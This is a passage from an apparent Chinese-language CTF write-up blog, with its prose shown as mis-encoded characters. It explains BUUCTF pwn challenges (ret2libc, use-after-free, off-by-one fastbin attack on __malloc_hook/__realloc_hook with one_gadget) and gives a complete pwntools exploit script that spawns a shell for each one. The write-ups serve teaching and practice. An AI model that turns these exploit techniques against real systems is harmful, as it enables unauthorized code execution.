class="number">0x88</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006F3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006f1</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>* offset + p64(pop_rsi_r15_ret) + p64(e.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;I have received your message, Thank you!\n&#x27;</span>)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>* offset + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¾—flag</p><p><img src="https://i.loli.net/2020/12/01/4lBnGzRhCecZ28H.png" alt="image.png"></p><h1 id="0x025-BJDCTF-2nd-ydsneedgirlfriend2-overwrite"><a href="#0x025-BJDCTF-2nd-ydsneedgirlfriend2-overwrite" class="headerlink" title="0x025.[BJDCTF 2nd]ydsneedgirlfriend2 - overwrite"></a>0x025.[BJDCTF 2nd]ydsneedgirlfriend2 - overwrite</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p><p><img src="https://i.loli.net/2020/12/01/mDEwn7F62VP9klh.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/01/AbWlLCKU6Sdxn5D.png" alt="image.png"></p><p>çœ‹èµ·æ¥æ˜¯ä¸€é“å †é¢˜ï¼Œå­˜åœ¨åˆ†é…ã€é‡Šæ”¾ã€æ‰“å°å †å—çš„åŠŸèƒ½</p><p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°ç¨‹åºä¸­å­˜åœ¨åé—¨å‡½æ•°</p><p><img src="https://i.loli.net/2020/12/01/Ym2n6FaAwBNOuV7.png" alt="image.png"></p><p>é¢˜ç›®æç¤ºæ˜¯Ubuntu18ï¼Œä¹Ÿå°±æ˜¯libc2.27ï¼Œå¼•å…¥äº†tcacheæœºåˆ¶ï¼Œä½†æ˜¯æ²¡æœ‰tcache double freeéªŒè¯çš„ç‰ˆæœ¬</p><p>addå‡½æ•°ä¸­ä¼¼ä¹åªèƒ½åˆ†é…7ä¸ªå †å—ï¼Œç©ºé—´æœ‰ç‚¹ç´§å¼ ï¼Œè€Œä¸”æ¯æ¬¡åˆ†é…åéƒ½ä¼šè¦†ç›–æ‰åŸæ¥çš„å †å—æŒ‡é’ˆ</p><p><img src="https://i.loli.net/2020/12/01/E5oFjm9cVOnTGXv.png" alt="image.png"></p><p>å¥½åœ¨freeåæœªå°†æŒ‡é’ˆç½®0ï¼Œ<strong>å­˜åœ¨Use After Free</strong>æ¼æ´</p><p><img src="https://i.loli.net/2020/12/01/yDu6BFCNoMLItQd.png" alt="image.png"></p><p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°<code>show()</code>å‡½æ•°ä¸­è°ƒç”¨çš„æ˜¯girlfriend[0][1]ä¸­çš„æ•°æ®ä½œä¸ºå‡½æ•°æŒ‡é’ˆæ¥æ‰§è¡Œï¼Œè€Œ<strong>girlfriend</strong>æœ¬èº«å°±æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œåœ¨åˆå§‹æ—¶åˆ†é…çš„æ˜¯0x10å¤§å°çš„å †å—</p><p><img src="https://i.loli.net/2020/12/01/Tk48oH5yF7NPvrp.png" alt="image.png"></p><p>æ•…æˆ‘ä»¬åªéœ€è¦åˆå§‹åŒ–girlfriendåfreeæ‰girlfriendå†é‡æ–°åˆ†é…ä¸€ä¸ª0x10å¤§å°çš„å †å—å³å¯æ”¹å†™è¯¥æŒ‡é’ˆä¸ºåé—¨å‡½æ•°åœ°å€åå†showå³å¯getshell</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./girlfriend&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;,27506)</span></span><br><span class="line">backdoor = <span class="number">0x400D86</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;u choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input the length of her name:&quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please tell me her name:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(backdoor))</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯getshell</p><p><img src="https://i.loli.net/2020/12/01/QHNE6DmMORUiGcF.png" alt="image.png"></p><h1 id="0x026-jarvisoj-level4-ret2libc"><a href="#0x026-jarvisoj-level4-ret2libc" class="headerlink" title="0x026.jarvisoj_level4 - ret2libc"></a>0x026.jarvisoj_level4 - ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/12/01/tUa3TvpBgSWh4bR.png" alt="I1__E1AGMQCM8C3C__IR4_N.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/01/NVODiTzqfhtI1Hy.png" alt="image.png"></p><p>ç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p><p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level4&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,28914)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¾—flag</p><p><img src="https://i.loli.net/2020/12/01/FxEkX38erav47Ad.png" alt="image.png"></p><h1 id="0x027-V-amp-N2020-å…¬å¼€èµ›-simpleHeap-off-by-one-fastbin-attack-one-gadget"><a href="#0x027-V-amp-N2020-å…¬å¼€èµ›-simpleHeap-off-by-one-fastbin-attack-one-gadget" class="headerlink" title="0x027.[V&amp;N2020 å…¬å¼€èµ›]simpleHeap - off by one + fastbin attack + one_gadget"></a>0x027.[V&amp;N2020 å…¬å¼€èµ›]simpleHeap - off by one + fastbin attack + one_gadget</h1><p>åˆæ˜¯ä¸€é“å †é¢˜æ¥äº†ï¼Œ<del>çœ‹æ¥å¾€ååº”è¯¥éƒ½æ˜¯å †é¢˜ä¸ºä¸»äº†</del>ï¼Œä¸å‡ºæ‰€æ–™ï¼Œä¿  æŠ¤  å…¨  å¼€</p><p><img src="https://i.loli.net/2020/12/01/iyIftbNOM4CrTka.png" alt="image.png"></p><p>åŒæ—¶é¢˜ç›®æç¤ºUbuntu16ï¼Œä¹Ÿå°±æ˜¯è¯´æ²¡æœ‰tcache</p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/01/IWHrRozGqyLDfUX.png" alt="image.png"></p><p>è¿™æ˜¯ä¸€é“æœ‰ç€åˆ†é…ã€æ‰“å°ã€é‡Šæ”¾ã€ç¼–è¾‘å †å—çš„åŠŸèƒ½çš„å †é¢˜ï¼Œä¸éš¾çœ‹å‡ºæˆ‘ä»¬åªèƒ½åˆ†é…10ä¸ªå †å—ï¼Œä¸è¿‡æ²¡æœ‰tcacheçš„æƒ…å†µä¸‹ï¼Œç©ºé—´å…¶å®è¿˜æ˜¯æŒºå……è¶³çš„</p><p>æ¼æ´ç‚¹åœ¨editå‡½æ•°ä¸­ï¼Œ<strong>ä¼šå¤šè¯»å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œå­˜åœ¨off by oneæ¼æ´</strong>ï¼Œåˆ©ç”¨è¿™ä¸ªæ¼æ´æˆ‘ä»¬å¯ä»¥<strong>ä¿®æ”¹ä¸€ä¸ªå †å—çš„ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªå †å—çš„size</strong></p><p><img src="https://i.loli.net/2020/12/01/o9PlK4ECbHuFiN6.png" alt="image.png"></p><p>ç”±äºé¢˜ç›®æœ¬èº«ä»…å…è®¸åˆ†é…å¤§å°å°äº111çš„chunkï¼Œè€Œè¿›å…¥unsorted binéœ€è¦malloc(0x80)çš„chunkï¼Œæ•…æˆ‘ä»¬è¿˜æ˜¯è€ƒè™‘åˆ©ç”¨off by oneçš„æ¼æ´æ”¹å¤§ä¸€ä¸ªchunkçš„sizeé€å…¥unsorted binååˆ†å‰²é€ æˆoverlappingçš„æ–¹å¼è·å¾—libcçš„åœ°å€</p><p><img src="https://i.loli.net/2020/12/03/mh1HLy7cvGrCUAQ.png" alt="image.png"></p><p>å› ä¸ºåˆšå¥½fastbin attackæ‰€ç”¨çš„chunkçš„sizeä¸º0x71ï¼Œæ•…æˆ‘ä»¬å°†è¿™ä¸ªå¤§chunkçš„sizeæ”¹ä¸º<code> 0x70 + 0x70 + 1 = 0xe1</code>å³å¯</p><blockquote><p>fastbin attackä¸­åˆ†é…åˆ°__malloc_hooké™„è¿‘çš„fake chunké€šå¸¸éƒ½æ˜¯malloc(0x60)ï¼Œä¹Ÿå°±æ˜¯size &#x3D;&#x3D; 0x71ï¼Œè¿™æ˜¯å› ä¸ºåœ¨__malloc_hook - 0x23è¿™ä¸ªåœ°å€ä¸Šfake chunkçš„SIZEçš„ä½ç½®åˆšå¥½æ˜¯0x<code>7f</code>ï¼Œæ»¡è¶³äº†ç»•è¿‡fastbinçš„sizeæ£€æŸ¥çš„è¦æ±‚</p><p><img src="https://i.loli.net/2020/12/03/GBrOqIdPnDluXhb.png" alt="image.png"></p></blockquote><p>ä¼ ç»Ÿæ€è·¯æ˜¯å°†__malloc_hookæ”¹ä¸ºone_gadgetä»¥getshellï¼Œä½†æ˜¯ç›´æ¥å°è¯•æˆ‘ä»¬ä¼šå‘ç°æ ¹æœ¬æ— æ³•getshell</p><p><img src="https://i.loli.net/2020/12/03/RXyTELuGiqKCSh7.png" alt="image.png"></p><p>è¿™æ˜¯å› ä¸ºone_gadgetå¹¶éä»»ä½•æ—¶å€™éƒ½æ˜¯é€šç”¨çš„ï¼Œéƒ½æœ‰ä¸€å®šçš„å…ˆå†³æ¡ä»¶ï¼Œè€Œå½“å‰çš„ç¯å¢ƒåˆšå¥½ä¸æ»¡è¶³one_gadgetçš„ç¯å¢ƒ</p><p><img src="https://i.loli.net/2020/12/03/DlinxIM76eTLu8S.png" alt="image.png"></p><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨reallocå‡½æ•°ä¸­çš„gadgetæ¥è¿›è¡Œå‹æ ˆç­‰æ“ä½œæ¥æ»¡è¶³one_gadgetçš„è¦æ±‚ï¼Œè¯¥æ®µgadgetæ‰§è¡Œå®Œæ¯•åä¼šè·³è½¬è‡³__realloc_hookï¼ˆè‹¥ä¸ä¸ºNULLï¼‰</p><p><img src="https://i.loli.net/2020/12/03/PNyq3WFTU8mtYSM.png" alt="image.png"></p><p>è€Œ__realloc_hookå’Œ__malloc_hookåˆšå¥½æ˜¯æŒ¨ç€çš„ï¼Œæˆ‘ä»¬åœ¨fastbin attackæ—¶å¯ä»¥ä¸€å¹¶ä¿®æ”¹</p><p><img src="https://i.loli.net/2020/12/03/AG3oW65aVeCzMgt.png" alt="image.png"></p><p>æ•…è€ƒè™‘ä¿®æ”¹__malloc_hookè·³è½¬è‡³reallocå‡½æ•°å¼€å¤´çš„gadgetè°ƒæ•´å †æ ˆï¼Œä¿®æ”¹__realloc_hookä¸ºone_gadgetå³å¯getshell</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28978</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># initialize chunk</span></span><br><span class="line">    new(<span class="number">0x18</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 3, prevent the top chunk consolidation</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># off by one get the unsorted bin chunk</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + <span class="string">b&#x27;\xe1&#x27;</span>) <span class="comment"># 0x70 + 0x70 + 1</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc addr</span></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line">    log.success(<span class="string">&quot;libc addr: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overlapping and fastbin double free</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 4, overlapping with idx 2</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake chunk overwrite __realloc_hook</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x13</span> - <span class="number">8</span>) + p64(libc_base + one_gadget) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + <span class="number">0x10</span>)) <span class="comment"># idx 5, our fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯get shell</p><p><img src="https://i.loli.net/2020/12/03/5hSCU9J7GdHwvWK.png" alt="image.png"></p><blockquote><p>ä¸å¾—ä¸è¯´V&amp;Nå‡ºçš„é¢˜è´¨é‡è¿˜æ˜¯å¯ä»¥çš„</p></blockquote><h1 id="0x028-jarvisoj-level3-x64-ret2csu-ret2libc"><a href="#0x028-jarvisoj-level3-x64-ret2csu-ret2libc" class="headerlink" title="0x028.jarvisoj_level3_x64 - ret2csu + ret2libc"></a>0x028.jarvisoj_level3_x64 - ret2csu + ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/12/01/wKnv9UQdNWiGAgq.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/01/zZDt4oywbmu2Rgp.png" alt="image.png"></p><p>ç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p><p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p><p>ä¸¤ä¸ªå°gadgetçš„åœ°å€å¦‚ä¸‹</p><p><img src="https://i.loli.net/2020/12/01/Uz1lFs8roh9uSye.png" alt="image.png"></p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level3_x64&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;,26836)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line">write_got = e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006b1</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(write_plt) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯getshell</p><p><img src="https://i.loli.net/2020/12/01/9YlXciZazB3WoQU.png" alt="image.png"></p><h1 id="0x029-bjdctf-2020-babystack2-integer-overflow-ret2text"><a href="#0x029-bjdctf-2020-babystack2-integer-overflow-ret2text" class="headerlink" title="0x029.bjdctf_2020_babystack2 - integer overflow + ret2text"></a>0x029.bjdctf_2020_babystack2 - integer overflow + 